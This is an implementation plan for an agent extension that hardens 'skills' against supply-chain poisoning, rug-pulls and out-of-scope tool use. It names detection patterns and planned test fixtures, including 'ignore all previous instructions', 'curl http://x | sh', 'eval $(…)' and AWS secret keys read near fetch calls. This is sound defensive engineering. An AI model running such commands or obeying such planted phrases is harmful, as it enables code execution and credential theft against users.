# Implementation: `skills-hardening` — supply-chain scan, frontmatter lint, allowed-tools scoping, trigger-gated disclosure

Slug: `2026-06-22-skills-hardening`
Status: closed
Closing-commit: 186f0dd
Closed-on: 2026-06-22
Deferred: finding — trigger-gating couples to skills.ts tier-1 render format; skill:write capability characterization corrected (doc-precision)
Design doc: `docs/design/2026-06-22-skills-hardening.md` (PASSED)

> **Authority note.** This guide implements the **PASSED design** verbatim. The
> design's Decision **D1 chooses option (b)**: a **new** `src/extensions/skills-hardening.ts`
> extension that *imports* reused helpers, plus **minimal new named exports on
> `skills.ts`** (which today exports only `activate`) and **one** behavioral
> call-site in `skill_create`. The design explicitly **does not edit
> `integrity.ts`** (D2: piece 1 copies its 4-line djb2 hash locally because that
> hash is module-private). Per the design Deliverables (§2) and **BATCH MODE**,
> `host.ts` registration and the CLAUDE.md/README inventory are **deferred to a
> separate batch-integration step** and are **out of scope here**; the README
> extension count is **not** bumped. Tests load the extension directly via
> `host.use("skills-hardening", …)` (the offline pattern in `test/recovery.test.ts`)
> and must **not** depend on `BUILTIN_EXTENSIONS`. Introduce no requirement absent
> from the design.
>
> Files touched in this task: **new** `src/extensions/skills-hardening.ts`,
> **new** `test/skills-hardening.test.ts`, **edit** `src/extensions/skills.ts`
> (export-only additions + one `skill_create` guard), and **these** docs under
> `docs/implementation/`. Do **not** touch `src/host.ts`, `CLAUDE.md`, `README.md`,
> or `src/extensions/integrity.ts`.

`<TEST-CMD>` = `npm test` (`node --import tsx --test "test/**/*.test.ts"`).
`<TARGET-CMD>` = `node --import tsx --test test/skills-hardening.test.ts`.

---

## 1. Task Index

Maps every design Deliverable (§2) and Acceptance Criterion (§7) to the phase
task that delivers it. (T# = Phase task numbers in §2.)

| Design artifact | Where it lands | Phase task |
| --- | --- | --- |
| **Deliverable** `skills-hardening.ts` — four killable additions, throwing-proof dispose | `src/extensions/skills-hardening.ts` | T15, T16, T17, T18, T19 |
| **Deliverable** `skills.ts` edit (a) — new named exports `scanSkills`, `skillsRoot`, `parseFrontmatter`, `validateFrontmatter` | `src/extensions/skills.ts` | T2, T15 |
| **Deliverable** `skills.ts` edit (b) — `skill_create` calls `validateFrontmatter` | `src/extensions/skills.ts` | T9 (test), T16 (impl) |
| **Deliverable** `test/skills-hardening.test.ts` (offline, `makeHarness`, temp `EAGENT_SKILLS_DIR`, `host.use`) | `test/skills-hardening.test.ts` | T1, T3–T8, T10–T14 |
| **Deliverable** kill switches (`EAGENT_SKILL_TRIGGERS=off` + per-piece independence) | hooks/registrations in new file | T13, T18, T19 |
| **Deliverable** `host.ts` registration | **(deferred to batch integration)** | — (not in scope) |
| **Deliverable** CLAUDE.md / README inventory; count **not** bumped | **(deferred to batch integration)** | — (not in scope) |
| **AC-1** body scan fires on a poisoned body (marker + new patterns), warn naming skill+marker | T3 | impl T15 |
| **AC-2** body scan is warn-only (skill still readable + listed) | T4 | impl T15 |
| **AC-3** body rug-pull detected across sessions; unchanged body not flagged | T5 | impl T15 |
| **AC-4** script scan flags a sibling script naming path+marker | T6 | impl T15 |
| **AC-5** `validateFrontmatter` rejects bad fields; clean → `[]` | T1 (unit) | impl T2 |
| **AC-6** `skill_create` enforces validator (no write on invalid; valid still writes) | T9 | impl T16 |
| **AC-7** `/skills` surfaces validation findings; valid skills still list | T7 | impl T15 |
| **AC-8** allowed-tools scoping asks/denies out-of-list tool; allows in-list | T10 | impl T17 |
| **AC-9** scoping no-op without `allowed-tools` (back-compat, 0 confirms) | T11 | impl T17 |
| **AC-10** scoping no-op for a never-activated skill (session-scoped, not catalog-wide) | T12 | impl T17 |
| **AC-11** trigger gating hides a non-matching skill's tier-1 line; injects on match (whole-word) | T13 | impl T18 |
| **AC-12** trigger gating respects `EAGENT_SKILL_TRIGGERS=off` (reverts to always-on) | T13 | impl T18 |
| **AC-13** trigger-less skills always injected (back-compat) | T13 | impl T18 |
| **AC-14** dispose loop never throws; hook counts return to pre-load values | T14 | impl T19 |

---

## 2. Phase Breakdown

**Single Phase** — one new extension, its single test file, and an export-only +
one-guard edit to `skills.ts`. There is no genuine seam to split on: the four
"pieces" share one `activate`, one dispose loop, and one test file, and
`<TARGET-CMD>` cannot import a half-written module. The four pieces are
*independently killable* at runtime (D6) but are authored together. So one Phase.

### Phase 1 — the `skills-hardening` extension

**Entry condition.** L1 design `docs/design/2026-06-22-skills-hardening.md` is
PASSED (it is). Working tree builds: `npm run typecheck` exit 0 and `npm test`
exit 0 **before** any edit (capture this baseline — it is the regression floor,
§5). No prior Phase.

**Design references.** §2 (Deliverables), §3 (NON-goals), §4 D1–D6, §5
(Dependencies/Assumptions), §6 (Relationships/Dedup), §7 AC-1…AC-14, §8
(Risks/Rollback).

#### Module shape to build (`src/extensions/skills-hardening.ts`)

A default-exported `activate(e: ExtensionAPI): () => void` that wires the four
pieces and returns a teardown that never throws (template: `write-guard.ts:93-101`,
`integrity.ts:107-115`). Reused imports (all `.js` specifiers, NodeNext):

- `import { detectSuspiciousDescription } from "./mcp.js";` — **already exported**
  (`mcp.ts:135`); imported as-is. (Markers: `override-instruction`,
  `hidden-from-user`, `secret-access`, `hidden-tag`, `exfil-verb`.)
- `import { triggered, latestUserText } from "./microagents.js";` — **already
  exported** (`microagents.ts:77,96`); imported as-is.
- `import { scanSkills, skillsRoot, parseFrontmatter, validateFrontmatter } from "./skills.js";`
  — these are the **new named exports** the design requires (D1; today `skills.ts`
  exports only `activate`).
- `import type { ExtensionAPI } from "../kernel/extension.js";`
- `import type { Message, ToolCallBlock } from "../kernel/types.js";`
- Node built-ins for the body/script sweep: `readdirSync`, `readFileSync` from
  `node:fs`; `join` from `node:path` (mirror `microagents.ts`'s `scanMicroagents`,
  but read SKILL.md *bodies* and sibling scripts, not `*.md` in a flat dir).

The four pieces (each independently killable per D6):

1. **Piece 1 — supply-chain body/script scan (warn-only, + rug-pull fingerprint).**
   - A **local** `fingerprint(s)` — copy `integrity.ts:36-40`'s 4-line djb2
     verbatim (D2: not imported; `integrity.ts` is **not** edited).
   - A `bodyMarkers(text)` that returns `detectSuspiciousDescription(text)`
     **plus** matches from a *small* new pattern set for `eval`,
     `child_process.exec`/`.exec(`, `curl … | sh`, and an env-credential token
     (`process.env.*` / `API_KEY` / `AWS_SECRET…` / `.env`) **near** an
     `http`/`fetch`/network token (AC-1's "env-near-network"). Keep the regex set
     small and warn-only; false positives are acceptable by D2/§8 (a skill that
     *teaches* curl trips it and still loads).
   - A `sweep()` that walks `skillsRoot()` via `scanSkills(skillsRoot())` to
     enumerate skills, then for each skill reads its `SKILL.md` body and any
     **top-level sibling** script files in the skill folder (`*.sh`/`*.js`/`*.py`
     /`*.ts` — top-level only, **no recursion**, §3 "No recursive scanning"),
     pattern-matching their text. Returns findings `{ skill, where ("body"|script
     path), markers[] }`. Never throws (unreadable file/dir → skip, like
     `scanSkills`).
   - A `skillBodyBaseline` store key (a **distinct** key from `integrity`'s
     `descBaseline` — §8 store-collision mitigation), holding `Record<skillName,
     fingerprint>`. On `session_start`: emit `e.log.warn` for each marker finding
     (naming the skill and the marker(s); AC-1/AC-4), emit `e.log.warn` for each
     skill whose body fingerprint **differs** from the recorded baseline
     (message must match `/changed since the last (session|scan)/i` — AC-3), then
     **re-record** the baseline (so the next session compares against now —
     `integrity.ts:81-82`). Surface the same findings via the `/skills` command
     (AC-7 — see piece 2).
   - Pattern: `integrity.ts:71-83` (the `session_start` sweep + re-baseline),
     adapted to skill bodies. Warn-only — never blocks, never quarantines (D2, §3).

2. **Piece 2 — frontmatter validator (`validateFrontmatter`, exported from `skills.ts`).**
   - A **pure** function `validateFrontmatter(fm: Record<string, string>):
     string[]` returning a list of human-readable errors (empty = valid). Lives in
     `skills.ts` (where `skill_create` already is) and is **exported** so the new
     file can call it on the scan path. Rules (D4):
     - `name`: required, `^[a-z0-9]+(-[a-z0-9]+)*$` (kebab-case), length ≤ 64.
     - `description`: required, non-empty, length ≤ 1024, **no `<` or `>`**.
     - allowed keys: `{ name, description, allowed-tools, triggers }` — any other
       key → an "unknown key" error.
   - **Surfacing on scan (AC-7):** the new file's `/skills`-time check (or a wrap
     of the existing `/skills` output) runs `validateFrontmatter(parseFrontmatter(
     md))` over each catalog folder and prints findings matching
     `/invalid|unknown key|too long/i`, while valid skills still list. (The new
     file owns its own surfacing; it must not silently replace `skills.ts`'s
     `/skills` listing of valid skills — design §2/§6 "valid skills still list".)
   - **Enforcement on authoring (AC-6):** the **one** behavioral edit in
     `skills.ts` — `skill_create.execute` calls `validateFrontmatter` on the
     frontmatter it is about to write and `fail`s with the rejected field if the
     result is non-empty, **before** `writeFileSync` (so no `SKILL.md` is written
     on invalid input; valid input still writes — back-compat). Guard so removing
     this one call restores the old accept-anything path (§8 rollback footprint).

3. **Piece 3 — allowed-tools scoping (session-scoped active set + `beforeToolCall` ask/deny).**
   - State source D3(c): a session-scoped `Map<skillName, Set<allowedToolName>>`
     (or `Set<string>` of the union of currently-active allowlists), reset on
     `session_start` **and** `session_shutdown` (exactly `write-guard.ts:89-91`).
   - Population via the existing `tool_end` event (the signal `write-guard.ts:68`
     uses): on a **successful** (`!result.isError`) `skill_read` whose
     `call.arguments.name` resolves to a skill whose frontmatter declares
     `allowed-tools`, record that skill's allowlist. Re-resolve the frontmatter by
     reading `<skillDir>/SKILL.md` and running `parseFrontmatter` (the exported
     helper), then parsing `allowed-tools` as a **comma-separated single-line
     list** (parse it identically to `microagents`' `triggers`: split on `,`,
     trim, drop empties — §5 Assumptions). No `allowed-tools` → record nothing
     (no-op; AC-9/AC-10).
   - Enforcement via `e.hook("beforeToolCall", …)` (value `ToolDecision`, context
     `{ call }`, `events.ts:41-58`): if `decision.block` already, return it
     unchanged (compose with upstream guards — §8). If **no** active skill
     declares `allowed-tools`, return `decision` (no-op — back-compat AC-9/AC-10).
     Otherwise, if the pending `ctx.call.name` is in **none** of the active
     allowlists, `ask` via `await e.agent.ui.confirm(...)`; on "no" return
     `{ ...decision, block: true, reason: "skills-hardening: blocked …" }`
     (reason must satisfy AC-8's `/skills-hardening: blocked|not in .* allowed-tools/i`),
     on "yes" return `decision` unchanged. A tool **in** an allowlist passes
     without a prompt. Shape mirrors `write-guard.ts:74-87`.
   - **Fail-open** (§8): if `skill_read`'s `tool_end` is missed/errored, the skill
     is simply never marked active and scoping no-ops for it — never fail-closed
     onto an unrelated tool.

4. **Piece 4 — trigger-gated tier-1 disclosure (own later `transformContext`).**
   - The new file registers its **own** `transformContext` hook that runs *after*
     `skills.ts`'s tier-1 hook and only **narrows** — strips, from the
     `skills`-sourced catalog note, the lines of skills that declare `triggers:`
     but whose triggers do **not** fire on `latestUserText(messages)` (reuse
     `triggered` whole-word, `microagents.ts:77`). It **never edits** `skills.ts`'s
     hook (design §6 "Conflicts: none"). Identify the `skills` note by its
     `meta.source === "skills"` (`skills.ts:56`) and/or its `Available skills`
     header text; rebuild that note's text with the gated lines removed (and drop
     the note entirely if nothing remains). Return the input **by reference** when
     there is nothing to change (the `microagents.ts:117-134` discipline).
   - A skill with **no** `triggers:` line is **always** kept (back-compat AC-13).
   - Kill switch `EAGENT_SKILL_TRIGGERS=off`, read **at hook time** like
     `microagents.ts:117` — when set, the gate is a pure pass-through and every
     skill's line stays (AC-12, reverts to always-on).
   - To know which catalog lines correspond to trigger-declaring skills, the hook
     re-resolves each catalog skill's frontmatter (`scanSkills` → per-skill
     `parseFrontmatter` for its `triggers`). Keep this read offline and
     never-throwing.

- **Teardown.** `activate` returns `() => { for (const d of [offStart, offToolEnd,
  offBeforeTool, offTransform, offShutdown, offCmd?]) { try { d.dispose(); }
  catch { /* teardown must not throw */ } } }` (AC-14; `write-guard.ts:93-101`).
- **No new capability** (§3): reuse `skill:read`/`skill:write` already granted in
  `skills.ts`. Do **not** call `e.grantCapability` for a new cap.

#### `skills.ts` edit (export-only + one guard)

- Add `export` to the existing `scanSkills`, `skillsRoot`, `parseFrontmatter`
  (currently module-private). These are **pure additions that change no existing
  behavior** and are inert if the new file is absent (§8).
- Add and `export` the new pure `validateFrontmatter`.
- In `skill_create.execute`, call `validateFrontmatter` on the `{name,
  description, …}` it is about to render and `fail` on a non-empty result **before
  writing** (the single behavioral edit — AC-6).
- **Do not** export `slug`/`renderSkill` (the new file does not need them — §5).

#### Task list (TDD order — every TEST names the BUSINESS INVARIANT it protects and precedes its impl)

> Tests are offline `node:test`, against `MockProvider` via `makeHarness`, with a
> temp `EAGENT_SKILLS_DIR` (set in `before`, like `test/skills.test.ts:11-15`),
> loading via `host.use("skills", skills)` and `host.use("skills-hardening",
> skillsHardening)` (the `test/recovery.test.ts:118-119` pattern). Use a per-test
> temp skill dir and a recording `Logger` (`makeHarness({ logger })`, keeping your
> own reference to the recorder — do **not** read it back off `Harness`) to
> capture `e.log.warn`. Save/restore any env var in `finally` (the
> `recovery.test.ts:152-169` discipline). Note `e.log` is the **prefixed**
> extension logger, so `warn` receives a leading `[skills-hardening]` tag argument
> **plus** the message — assert on a **substring**/`/regex/i` of the message,
> never exact first-argument equality.

The validator (T1/T2) is pure and has no dependency on the rest, so it is built
first; then the four runtime pieces in scan → authoring-enforcement → scoping →
trigger order; then dispose.

1. **T1 — TEST `validateFrontmatter` (unit).**
   *Invariant: malformed frontmatter — non-kebab/over-long `name`, empty/over-long
   `description`, angle brackets in `description`, or an unknown key — is rejected;
   only the four allowed keys with valid shapes pass.* (AC-5.) Assert
   `validateFrontmatter({name:"ok-name", description:"fine"})` deep-equals `[]`;
   and that each of: `name:"Bad Name"` (uppercase+space), `name:"a".repeat(65)`,
   `description:""`, `description:"x".repeat(1025)`, `description:"<script>x"`,
   and an unknown key (`{name:"ok",description:"y",frobnicate:"z"}`) yields
   `.length > 0`. Also assert the four allowed keys
   (`name,description,allowed-tools,triggers`) together pass.
   - Accept: `<TARGET-CMD>` (this test red — `validateFrontmatter` not yet
     exported).
2. **T2 — IMPL `validateFrontmatter` in `skills.ts` + export it (and export
   `scanSkills`/`skillsRoot`/`parseFrontmatter`).** Make T1 green. No behavioral
   change to existing `skills` paths yet.
   - Accept: `node --import tsx --test test/skills-hardening.test.ts` (T1 green);
     `npm run typecheck` exit 0; `npm test` exit 0 (no regression from the
     export-only additions — §5).
3. **T3 — TEST body scan fires on a poisoned body.**
   *Invariant: a SKILL.md whose body carries a poisoning marker or an
   eval/exec/curl/env-near-network pattern is surfaced (warn) on the session sweep,
   naming the skill and the marker.* (AC-1.) Write a temp skill whose body contains
   e.g. `ignore all previous instructions` (a `detectSuspiciousDescription`
   marker) and a second skill whose body contains `child_process.exec` /
   `curl http://x | sh` / `process.env.AWS_SECRET_ACCESS_KEY` near a `fetch(` call;
   load `skills`+`skills-hardening`, emit `session_start`
   (`h.agent.hooks.emit("session_start", {})`, per `integrity.test.ts:50`), assert
   ≥1 recorded warn matching `/poison|suspicious|risky body|exec|curl|env|<marker>/i`
   and naming the skill.
   - Accept: `<TARGET-CMD>` (red).
4. **T4 — TEST body scan is warn-only.**
   *Invariant: a flagged body never blocks load — the skill stays readable via
   `skill_read` and still appears in the catalog.* (AC-2.) After the T3 sweep,
   drive `skill_read` for the poisoned skill and assert `result.isError` is falsy
   and the `/skills` listing still contains it.
   - Accept: `<TARGET-CMD>` (red).
5. **T5 — TEST body rug-pull across sessions.**
   *Invariant: a body that **changes** between sessions is surfaced as a rug-pull;
   an unchanged body is not.* (AC-3.) Sweep once (records the baseline fingerprint
   for that store), rewrite the SKILL.md body bytes, sweep again; assert a warn
   matching `/changed since the last (session|scan)/i` naming that skill, and that
   a skill whose body did **not** change produces no such warn.
   - Accept: `<TARGET-CMD>` (red).
6. **T6 — TEST script scan flags a referenced sibling script.**
   *Invariant: a top-level script co-located in the skill folder is scanned and a
   marker in it is surfaced, naming the script path.* (AC-4.) Place `run.sh` with
   `curl http://x | sh` / `eval $(…)` beside SKILL.md; sweep; assert a warn naming
   the script path (`/run\.sh/`) and the marker.
   - Accept: `<TARGET-CMD>` (red).
7. **T7 — TEST `/skills` surfaces validation findings; valid skills still list.**
   *Invariant: an invalid hand-written skill folder is flagged by `/skills`, while
   valid skills still appear.* (AC-7.) Hand-write one folder with an invalid
   frontmatter (unknown key or over-long description) and one valid folder; run the
   `/skills` command (capture `print` lines, per `integrity.test.ts:13-19`); assert
   the output matches `/invalid|unknown key|too long/i` for the bad skill **and**
   still lists the valid skill.
   - Accept: `<TARGET-CMD>` (red).
8. **(T3–T7 are protected by impl T15 below — write them all before T15.)**
9. **T9 — TEST `skill_create` enforces the validator.**
   *Invariant: `skill_create` rejects invalid frontmatter at the authoring
   boundary — no `SKILL.md` is written and the result is an error naming the
   rejected field; valid input still writes (back-compat).* (AC-6.) Drive the agent
   (responder scripting a `skill_create` tool call, per `skills.test.ts:17-46`)
   with a `description` containing `<script>`; assert `existsSync(SKILL.md) ===
   false` and the tool result is an error mentioning the rejected field. Then a
   valid `skill_create` still writes its `SKILL.md`.
   - Accept: `<TARGET-CMD>` (red).
10. **T10 — TEST allowed-tools scoping asks/denies an out-of-list tool; allows
    in-list.** *Invariant: while a skill with `allowed-tools` is active, a tool
    outside its allowlist is asked and denied on "no"; a tool inside passes.*
    (AC-8.) Create a skill `allowed-tools: read`. Drive `skill_read` that skill,
    then a `bash` call. With `makeHarness({ ui: { confirm: async () => false,
    notify(){} } })` assert the `bash` call is blocked (a tool message / decision
    reason matching `/skills-hardening: blocked|not in .* allowed-tools/i`); with
    `confirm => true` assert it proceeds; and assert a `read` call (in-list) passes
    with **no** prompt.
    - Accept: `<TARGET-CMD>` (red).
11. **T11 — TEST scoping is a no-op without `allowed-tools` (back-compat).**
    *Invariant: a skill that declares no `allowed-tools` imposes no scoping — after
    `skill_read`, any tool runs with zero confirm prompts.* (AC-9.) Count
    `confirm` calls; assert `0` after `skill_read` + `bash`.
    - Accept: `<TARGET-CMD>` (red).
12. **T12 — TEST scoping is a no-op for a never-activated skill.**
    *Invariant: activation is session-scoped, not catalog-wide — a skill declaring
    `allowed-tools` but never `skill_read` constrains nothing.* (AC-10.) With such
    a skill present but unread, a `bash` call runs unprompted (`confirm` count 0).
    - Accept: `<TARGET-CMD>` (red).
13. **T13 — TEST trigger gating: hide non-matching, inject on match, respect kill
    switch, always-inject trigger-less.** *Invariant: a `triggers:` skill's tier-1
    line appears only when a trigger word is whole-word-present in the latest user
    message; `EAGENT_SKILL_TRIGGERS=off` reverts to always-on; a trigger-less skill
    is always injected.* (AC-11/12/13.) Inspect the injected `req.messages` catalog
    note (the `skills.test.ts:48-65` technique). For a skill `triggers: kubernetes`:
    on `"hello"` the note does **not** contain its name; on `"deploy to
    kubernetes"` it **does** (whole-word). With `EAGENT_SKILL_TRIGGERS=off`
    (set/restore in `finally`) the line appears regardless. A skill with **no**
    `triggers:` appears on any message, gate on or off.
    - Accept: `<TARGET-CMD>` (red).
14. **T14 — TEST dispose loop never throws and unregisters cleanly.**
    *Invariant: unloading the extension restores every hook count to its pre-load
    value and never throws.* (AC-14.) Capture `agent.hooks.listenerCount` (or the
    delta technique used by `prune`/`risk-guard` tests) for `beforeToolCall`,
    `tool_end`, `session_start`, `session_shutdown`, and `transformContext` before
    `host.use`, after `host.use`, and after `host.unload("skills-hardening")`;
    assert post-unload counts equal pre-load counts and `unload` did not throw.
    - Accept: `<TARGET-CMD>` (red).
15. **T15 — IMPL piece 1 (body/script scan + rug-pull) in
    `src/extensions/skills-hardening.ts`** — `fingerprint` (local djb2 copy),
    `bodyMarkers` (reused `detectSuspiciousDescription` + small new pattern set),
    `sweep`, `skillBodyBaseline` store, the `session_start` warn+re-baseline, and
    the `/skills`-time validation surfacing (piece 2's surfacing half). Makes
    T3–T7 green.
    - Accept: `<TARGET-CMD>` (T3–T7 green); `npm run typecheck` exit 0.
16. **T16 — IMPL piece 2 enforcement** — the one `skill_create` guard call in
    `skills.ts`. Makes T9 green.
    - Accept: `<TARGET-CMD>` (T9 green); `npm run typecheck` exit 0; `npm test`
      exit 0 (the existing `skills.test.ts` authoring test stays green — valid
      input still writes; §5).
17. **T17 — IMPL piece 3 (allowed-tools scoping)** — the active-skill `Map`/`Set`,
    `tool_end` population on successful `skill_read`, the `beforeToolCall` ask/deny,
    and the `session_start`/`session_shutdown` resets. Makes T10–T12 green.
    - Accept: `<TARGET-CMD>` (T10–T12 green); `npm run typecheck` exit 0.
18. **T18 — IMPL piece 4 (trigger-gated tier-1)** — the new file's own later
    `transformContext` that narrows the `skills`-sourced note, reusing `triggered`/
    `latestUserText`, with `EAGENT_SKILL_TRIGGERS=off` read at hook time. Makes T13
    green.
    - Accept: `<TARGET-CMD>` (T13 green); `npm run typecheck` exit 0.
19. **T19 — IMPL teardown** — the throwing-proof dispose loop over all
    registrations. Makes T14 green.
    - Accept: `<TARGET-CMD>` (all green); `npm run typecheck` exit 0; `npm test`
      exit 0.

**Per-task acceptance commands (runnable from repo root):**
- Targeted: `node --import tsx --test test/skills-hardening.test.ts`
- Typecheck: `npm run typecheck`
- Full regression: `npm test`

**Exit condition.** `node --import tsx --test test/skills-hardening.test.ts` →
`# fail 0` covering AC-1…AC-14; `npm run typecheck` exit 0; `npm test` exit 0
(`# fail 0`, 0 skipped). `src/extensions/skills-hardening.ts` and
`test/skills-hardening.test.ts` exist; `skills.ts` carries only the four new
exports + the one `skill_create` guard; `integrity.ts`, `host.ts`, `CLAUDE.md`,
`README.md` are **unchanged**.

---

## 3. Engineering Constraints Index

- **House conventions** (`CLAUDE.md` "House conventions"):
  - **ESM + NodeNext** — `.js` import specifiers **even for `.ts` files** (e.g.
    `import { detectSuspiciousDescription } from "./mcp.js"`).
  - **Strict TypeScript** — `strict`, `noUncheckedIndexedAccess`,
    `noImplicitOverride`, `noFallthroughCasesInSwitch` all on. **No `any`** — model
    the types (e.g. typed `Record<string,string>` frontmatter, `Set<string>`,
    `ToolCallBlock`).
  - **Zero runtime deps except `jiti`** — **pure Node built-ins only**; no YAML
    library (the validator is a hand-rolled regex/length check — D4 explicitly
    rejects a YAML dep), no SDK.
  - **Capability-gated side effects** — reuse `skill:read`/`skill:write`; add **no
    new capability** (§3). Scoping enforces via the existing capability ask/deny
    vocabulary, not a new cap.
  - **Offline tests** via `node:test` run through `tsx`, against `MockProvider`
    (`makeHarness`). No network, no `ANTHROPIC_API_KEY`.
  - **Kill switch** — `EAGENT_SKILL_TRIGGERS=off` (piece 4); each of the four
    pieces is independently disablable/revertable (D6).
  - **Dispose loop that never throws** — every registration disposed in a
    `try/catch` (`write-guard.ts:93-101`).
- **Extension-author rules** (`docs/EXTENSIONS.md` / `CLAUDE.md`): register through
  the `ExtensionAPI`; every registration is tracked so reload is clean; gate side
  effects behind a capability; ship an offline test.
- **Hook surface used** (`src/kernel/events.ts`): events via `e.on` —
  `session_start`, `session_shutdown`, `tool_end{call,result}`; filters via
  `e.hook` — `beforeToolCall{ToolDecision,{call}}` and
  `transformContext{Message[],{turn,model}}`. `e.agent.tools.get/list`,
  `e.agent.ui.confirm`, `e.store.get/set`, `e.log.warn`, `e.registerCommand`.
- **BATCH MODE (do not violate):** do **not** edit `src/host.ts`, `CLAUDE.md`,
  `README.md`, or `src/extensions/integrity.ts`. No `BUILTIN_EXTENSIONS` line, no
  inventory line, no README count bump — all deferred.
- **Commit conventions:** `feat(phase1):` opener; `fix(phase1-roundR): <keyword>`
  for within-round fixes; include `npm test` and `npm run typecheck` results as
  trailers; **no** mention of AI/model/tooling in commit messages.

---

## 4. Data / Fixture Dependencies

- **Reuse `test/helpers.ts`** `makeHarness` as-is (no helper change is required by
  this design): `makeHarness({ responder, fallback, ui, logger })`. Capture
  `e.log.warn` by passing a small **recording `Logger`** (an object whose `warn`
  pushes to a local array) via `makeHarness({ logger })` and keeping your own
  reference — do **not** add a field to `Harness` and do **not** read it back off
  the harness (the `risk-guard`/`recovery` discipline).
- **Temp skill dirs** via `mkdtempSync(join(tmpdir(), "eagent-skills-hardening-"))`
  with `process.env.EAGENT_SKILLS_DIR` pointed at it (`skills.test.ts:11-15` /
  `recovery.test.ts:84-99`), each SKILL.md hand-written per test; clean up in
  `finally`. **No committed fixtures, no network.**
- **Offline LLM** is `MockProvider` (scriptable `responder`), used to drive
  `skill_create`/`skill_read`/`bash` tool calls (`skills.test.ts` /
  `recovery.test.ts` responder pattern). For tier-1 inspection, capture
  `req.messages` inside a function responder (`skills.test.ts:48-65`).
- **Env vars touched:** `EAGENT_SKILLS_DIR` (test fixture root) and
  `EAGENT_SKILL_TRIGGERS` (T13 kill-switch) — both saved/restored in `finally`
  (`recovery.test.ts:152-169`).
- **Store** is the in-memory `MemoryBackend` from the harness; the body baseline
  lives under the **distinct** key `skillBodyBaseline` (never `integrity`'s
  `descBaseline` — §8).

---

## 5. Regression Protection

- **Baseline floor.** Before any edit, capture `npm test` exit 0 (note the pass
  count, e.g. `N/N`, 0 skipped) and `npm run typecheck` exit 0. This is the floor
  the Phase must restore.
- **`skills.ts` existing behavior must stay green** — `test/skills.test.ts`'s
  three tests (authoring writes a slugified SKILL.md; tier-1 injects the catalog;
  authoring gated by `skill:write`) must all stay green. The export-only additions
  change nothing; the **single** `skill_create` guard must keep *valid* input
  writing (the first skills test uses a valid `description`, so it must still
  write — re-run `test/skills.test.ts` after T16).
- **`integrity.ts` existing behavior must stay green** — `test/integrity.test.ts`'s
  four tests must be untouched and green. `integrity.ts` is **not edited** (D2),
  and piece 1 uses a **distinct** store key, so it cannot corrupt `descBaseline`.
- **`microagents.ts` exports reused, not changed** — `triggered`/`latestUserText`
  are imported as-is; `test/microagents.test.ts` must stay green (no edit to that
  module).
- **`mcp.ts` export reused, not changed** — `detectSuspiciousDescription` imported
  as-is; `test/mcp.test.ts` must stay green.
- **Composition with other `beforeToolCall` guards** — the scoping filter returns
  the threaded `ToolDecision` unchanged on every path except an active-allowlist
  miss denied at the ask, and sets `block:true`/`reason` only there, so it composes
  with `write-guard`/`flow-guard`/`bash-policy` without reordering assumptions
  (kernel `shouldStop` short-circuits on the first block — `hooks.ts:93-107`).
  Re-run their tests (`test/write-guard.test.ts`, `test/flow-guard.test.ts`,
  `test/bash-policy.test.ts`) — green.
- **Full suite** — `npm test` exit 0 (`# fail 0`, 0 skipped) and `npm run
  typecheck` exit 0 at Phase exit. No test asserts a `BUILTIN_EXTENSIONS` count
  (none is changed here anyway), and the new extension is loaded only via
  `host.use` in its own test.
